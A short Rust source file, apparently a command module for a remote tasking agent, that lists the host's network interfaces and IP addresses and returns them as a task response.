use crate::structs::Task;

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    match local_ip_address::list_afinet_netifas() {
        Ok(interfaces) => {
            let mut output = String::new();
            for (name, ip) in &interfaces {
                output.push_str(&format!("{}: {}\n", name, ip));
            }
            response.user_output = output;
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed to list interfaces: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
